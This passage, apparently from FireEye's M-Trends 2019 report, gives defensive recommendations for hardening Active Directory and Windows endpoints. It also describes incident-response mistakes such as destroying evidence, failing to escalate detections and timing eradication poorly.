replicate privileged onpremise accounts to Microsoft Azure using AD\nConnect.\n\n\n-----\n\n###### ACTIVE DIRECTORY HARDENING\nActive Directory is the core foundation and backend platform for most organizations. It provides identity management,\nauthentication services and authorization for access to applications and data. Threat actors commonly exploit Active\nDirectory misconfigurations to elevate privileges and move laterally through an environment.\n\n**Tips for active directory hardening**\n\n\n\n- Review Forest architectures and trusts. Focus on\nthe direction of the trust and if any security controls\n(selective authentication, SID filtering, disabling\nof Kerberos Full Delegation across the trust) are\nenforced. Mandiant experts commonly observe Active\nDirectory trusts that are configured for bi-directional\nauthentication, with few controls enforced to restrict\nand govern the scope of accounts permitted to access\nresources across a trust boundary. Without controls in\nplace, an attacker can jump from one forest to another\nand move laterally across a trust boundary.\n\n\n\n- Review operational processes and hardening strategies\nfor Active Directory, such as:\n\n–– Logging / monitoring / alerting for Active Directory\nspecific events\n\n–– Group Policy Objects (GPOs)\n\n–– Administration models (access control tiers)\n\n–– Remote administration\n\n–– Service principal names (SPNs)\n\n–– Service accounts\n\n–– Privileged accounts\n\n–– Delegated accounts\n\n–– Accounts with directory replication permissions\n\n–– Password policies\n\n–– Kerberos authentication policies\n\n–– Access control (ACL) configurations for accounts\n\n\n-----\n\n###### ENDPOINT HARDENING\nA user endpoint is the most common starting point of an initial compromise. In addition to network segmentation and\ncommunication restrictions between endpoints, additional hardening should be implemented to enhance controls that\nprevent initial infection, lateral movement and privilege escalation.\n\n**Tips for endpoint hardening:**\n\n\n\n- Use Group Policy settings to centrally enforce hardening\ncontrols for Microsoft Office to minimize endpoint\ninfection risks due to a weaponized email attachment or\ndocument. Protection considerations include:\n\n–– Restrictions to block macros from running in Office\nfiles received from external sources\n\n–– Trust Center hardening that defines and enforces\ncontrols for Dynamic Data Exchange (DDE), trusted\ndocuments, trusted locations, File Block settings,\nProtected View and automatic links\n\n–– Object Linking and Embedding (OLE) to block\nspecific file extensions for OLE embedding\n(py;rb;iqy) not blocked by default by Microsoft, and\nto restrict OLE package activation behaviors\n\n- Disable legacy versions of protocols on endpoints, as\nthese provide a vector for an attacker to use tools that\nrely upon the functionality of legacy protocols, such as\nSMB v1.0 and PowerShell v2.0.\n\n- Disable WDigest authentication on endpoints (Windows\nOS platforms pre-Windows 8.1 / 2012 R2). If WDigest\nauthentication is enabled, cleartext credentials are\nstored in memory. WDigest authentication can be\ndisabled via a registry modification or by using a\nMicrosoft Group Policy ADMX template.\n\n- Review and reduce the scope of standard users with\nlocal administrative permissions on endpoints.\n\n- Ensure that the built-in local administrator account\nhas a unique and random password configured across\nall endpoints. Use the Microsoft Local Administrator\nPassword Solution tool (LAPS)[13] or a third-party\n\n\nprivileged access management (PAM) technology.\nAdditionally, any local administrator accounts should\nbe restricted from initiating network, service, or remote\ndesktop (RDP)-based logons across endpoints. Using\nGroup Policy, any local administrative accounts can be\nreferenced via the security setting of:\n\nS-1-5-114: NT AUTHORITY\\Local account and\nmember of Administrators group\n\n- Enforce segmentation at the endpoint to prevent\ncommon lateral movement techniques between\nsystems. Endpoint segmentation controls can even\nprevent ransomware from propagating throughout an\nenvironment and impacting operations and system\navailability. Common endpoint segmentation controls\nfor implementation using host-based firewalls (including\nWindows Firewall) include:\n\n–– Blocking SMB communications between\nworkstations and laptops\n\n–– Blocking RDP communications between\nworkstations and laptops, and from user endpoints\nto servers and critical assets\n\n–– Blocking WMI and Windows Remote Management\n/ PowerShell Remoting (WinRM) between\nworkstations and laptops, and from user endpoints\nto servers and critical assets\n\n–– Enforce application whitelisting, starting with critical\nservers and systems (e.g., Domain Controllers).\nApplocker[14] is an inherent enterprise-level Microsoft\ntechnology that can be used to enforce application\nwhitelisting on Windows systems.\n\n\n13 See Local Administrator Password Solution on Microsoft TechNet https://technet microsoft com/en-us/mt227395 aspx\n\n\n-----\n\n###### Programmatic Enhancements\n from the Frontlines of Incident Response\n\nIn addition to the security configuration and architectural weaknesses\ncommonly observed during investigation and remediation, FireEye\nMandiant consultants repeatedly observed three common issues during\nenterprise investigations in 2018.\n\n- Destruction of evidence, which leads directly to unanswered questions in\nthe investigative process.\n\n- Lack of proper investigation and escalation of initial detections, which\nallows a larger attack to go unnoticed.\n\n- Poorly timed eradication actions, which are unsuccessful in eradicating\nattacker access and complicate the investigative process.\n\nWhile premediation covers technical enhancements, organizations can\nalso make programmatic changes to improve both their incident response\nprogram and their ability to support remediation activities.\n\n\n-----\n\n**Destruction of Evidence**\n\nTo facilitate rapid remediation of identified threats, Mandiant has observed that organizations build incident response plans and\nassociated use cases and playbooks that follow the “re-image and replace” model. For example:\n\n\nSecurity toolset identifies a possible threat\non a user’s workstation and generates an\nalert for an analyst.\n\n\nThe analyst analyzes the system, confirms\nthe presence of malware but identifies no\nother malicious activity.\n\n\nThe analyst initiates a process to reimage the compromised workstation,\nso the user can get back to work\nquickly.\n\n\nIf the detected activity was part of a larger breach unnoticed by the frontline analyst, these issues could destroy valuable evidence\non the workstation. We have conducted investigations where key questions went unanswered due to this type of data destruction,\nincluding identification of the initial point of entry for an attack or details on the full extent of data stolen by an attacker.\n\n\n**Lack of Investigation**\nWe frequently uncovered evidence of attacker malware\nthat was identified and/or cleaned by security tools. It was\nnot uncommon to learn that that detection was not only\nescalated to a central dashboard, but also reviewed by an\nanalyst.\n\nFor example, an attacker moves laterally to a workstation\nand executes a password harvesting tool that is stopped\nand cleaned by antivirus software. Following a playbook,\nthe analyst:\n\n- Confirms that the tool detected the malware.\n\n- Confirms that the tool successfully eradicated that piece\nof malware.\n\n\nThe playbook lacked steps that would help understand\nthe context of the malware and determine if it required\na more in-depth analysis of the infected system or the\nbroader environment. If a more in-depth analysis had been\nperformed, the analyst could have identified that access\nto the system occurred as a result of lateral movement\nfrom another system in the environment and not through\na new attack. The analyst might have discovered that\nthe attacker ran several different tools over an extended\nperiod of time—clues that this was part of a larger breach.\n\nIn this case, a deficient playbook contributes directly to a\nlarger breach, because the attacker went unnoticed for a\nlonger period of time. This is critical, because the sooner a\nvictim identifies an intrusion, the faster they can respond\nto it, thus reducing the amount of time attackers have to\naccomplish their mission.\n\n\n-----\n\n**Poorly Timed Remediation**\nEven when organizations do correctly identify malicious\nactivity as being part of a larger breach, we have observed\norganizations hamper investigations due to timing\nmistakes in their response and remediation processes. This\nis especially true for organizations that become aware\nof a breach by a sophisticated group through external\nnotification from law enforcement. These notifications\noften result from lengthy investigations into specific attack\ngroups and occur after attackers have had access to the\nvictim environment for months.\n\nAfter confirming the initial lead from law enforcement, the\nvictim takes immediate steps to eradicate the attackers,\nincluding removing affected systems from the network,\nblocking access to known command and control channels\nand changing the passwords of known affected user\naccounts.\n\nSophisticated attack groups that have had long term access\nto a victim are likely to have deployed multiple different\nbackdoors and avenues for remote access to the victim’s\nnetwork to ensure that they maintain persistence over time.\nIn these cases, hasty eradication measures are unlikely to\nremove these remote access methods. This not only fails\nto eradicate the attacker from the environment, but also\nresults in the loss of the only current visibility into attacker\nactivity. This sequence of events may motivate the attacker\nto modify TTPs or take additional actions to maintain their\naccess.\n\nIn these scenarios, the victim fails to eradicate the attacker,\ncomplicates the investigation and prolongs the investigation\nand remediation process. By responding too quickly, the\nvictim inadvertently prolongs the breach.\n\n\n**Recommendations for Enabling Effective Remediation**\nThese common issues could have been prevented by\nadopting a more robust incident response plan and\nplaybooks for investigation and response. Based on\nMandiant observations, FireEye recommends that\norganizations:\n\n- Conduct regular reviews of their incident response\nplan, use cases and playbooks\n\n–– Perform internal tabletop training exercises, red/blue\nteam exercises or third-party reviews.\n\n–– Consider events and incidents of different severities\nand complexities and account for real world\nfactors such as inconclusive evidence, mistakes by\nresponders and business impact of eradication steps.\n\n- Ensure that these documents include processes that\npreserve evidence\n\n–– Consider what steps in their existing playbooks\nresult in destruction of evidence, what evidence\nis destroyed and how that could impact\ninvestigations. Use this data to weigh the risk of\nevidence destruction against the cost of evidence\npreservation and incorporate procedures to archive\nrelevant evidence in response playbooks.\n\n–– Include or reference approved processes for the\nproper handling, storage and documentation of\nevidence in incident response plans.\n\n\n-----\n\n- Develop guidelines to understand the context around\nidentified threats and establish escalation procedures\nto more experienced analysts\n\n–– Develop a threat and severity matrix for security\nevents and incidents to establish thresholds that will\nallow investigators to determine when escalation is\nnecessary. Thresholds should not be based solely\non simple volume metrics, but the context of the\nidentified activity. Organizations should understand\nthe threats facing them, how targeted threat\nactors operate and the forensic evidence that can\ndistinguish a commodity threat from an advanced\nattacker. Define thresholds and consistently refine\nthem based on this information.\n\n–– Define roles and responsibilities for triage and\ninvestigation support throughout the organization\nto enable timely communication during escalation of\nevents or incidents.\n\n–– Develop an escalation matrix that will allow\ninvestigators to quickly determine the appropriate\ntiming and path for escalations based on incident\nseverity.\n\n–– Incorporate the concept of eradication timing,\ndepending on the context of the breach.\n\n–– Include guidelines on eradication timing in playbooks\nthat accommodate the threat and severity matrix.\nEscalate relevant information to stakeholders to\nempower them to make decisions about eradication\ntiming.\n\n–– Develop incident remediation plans for complex\nactivities that may be required following a breach.\nThese plans will help the organization properly plan\nfor and execute the operations required to remove a\nthreat from the environment.\n\n–– Coordinate and develop remediation plans with\ninput from all stakeholders that will be involved with\nimplementing technical plans.\n\n\n**Conclusion**\nWe have observed victim organizations with consistent\nweaknesses in their security program that led to attackers\nsuccessfully accomplishing their goals and victim\norganizations failing at detecting, investigating, and\nresponding to attacker activity. Organizations can learn\nfrom these mistakes to improve their resilience to targeted\nattackers, enable their detection and response teams to\nmore effectively answer critical investigative questions and\neffectively remediate breaches.\n\nBy following the guided principles and methodology\nof premediation, organizations can naturally create the\nfoundational elements for proactively hardening and\nsecuring their infrastructure based on proven and tested\nsecurity controls which are often used to contain and\neradicate attackers from environments. This proactive\nmethodology is a proven and effective way to help prevent\nan initial event from becoming a large-scale incident\nthat impacts an organization’s system availability, data\nconfidentially and brand reputation.\n\nOrganizations in a reactive state use this same\npremediation framework to eradicate threat actors\nand harden their environments to prevent against recompromise and future attacks. In a proactive state,\nthese principles can bolster existing security controls and\nmitigate risks related to tactics and techniques used by\nthreat actors.\n\nBy regularly reviewing and updating their incident\nResponse Plans and associated use cases and playbooks,\norganizations can mitigate the risk of destruction of\nimportant evidence, failure to identify major breaches,\nand extending the duration of breaches. Organization\nshould incorporate important concepts such as evidence\npreservation during remediation activities, context of alerts\ninstead of simple volume metrics, and eradication timing\ninto these documents. This will empower front line analysts\nto effectively escalate relevant information to decision\nmakers and avoid costly mistakes.\n\n\n-----\n\n##### CONCLUSION\n\n###### APT37\n\n**947230**\n\n\n-----\n\nThrough one lens, it’s easy to see how much has changed\nin the cyber security industry in the past decade. The\nglobal median dwell time is now 78 days, nearly a full\nyear less than it was in 2011, when we first reported the\nstatistic. Imagine how bad things would be today if the\naverage attacker was still hiding in systems for that long.\nWe learned firsthand in this year’s report in the case of\nthe telecommunications company and the attacker who\nmaintained access for at least three years.\n\nYet through another lens, not much has changed in the\nindustry in the past decade. Until core technology evolves\nbeyond the familiar, the very essence of cyber security will\nlikely remain the same: threat actors from various nations\nwith diverse motivations will target networks and systems\naround the globe, and defenders will have what often feels\nlike an impossible task of keeping up with those threats,\nand doing everything they can—and that is required—to\nshut them down.\n\nThere are many important takeaways from M-Trends\n2019. We learned about the latest APT threat activity\nstemming from North Korea, Russia, Iran and China. We\nlearned about the value of early identification and having\nvisibility across all solutions and services. And based on\nthe experience of our Mandiant red teams, we learned how\nmismanaged multifactor authentication, weak passwords\nand a lack of account segmentation will almost certainly\nlead to a breach.\n\n\nA red team engagement is one of the best ways for\norganizations to test their security. Mandiant red teams\nuse nondestructive methods to accomplish a set of\njointly agreed upon mission objectives. The red team\nclosely mimics a real attacker’s active and stealthy attack\nmethods by using tactics, techniques and procedures seen\nduring some of the latest incident response engagements.\nThis helps security teams assess their ability to detect and\nrespond to an active attacker scenario.\n\nTo also improve preparedness, we encourage organizations\nto hold incident response tabletop exercises to simulate\ntypical intrusion scenarios. These exercises help expose\nparticipants—notably executives, legal personnel and other\nstaff—to incident response processes and concepts.\n\nOne other thing that hasn’t changed in 10 years: cyber\nsecurity professionals continue to diligently defend against\nbad actors that determinedly pursue their objectives.\n\nFireEye will continue to publish M-Trends in the years\nto come, to improve our collective security awareness,\nknowledge and capabilities.\n\n\n-----\n\n###### To learn more about FireEye, visit: www.fireeye.com\n\n\n**FireEye, Inc.**\n601 McCarthy Blvd. Milpitas, CA 95035\n408.321.6300/877.FIREEYE (347.3393)\ninfo@FireEye.com\n\n© 2019 FireEye, Inc.
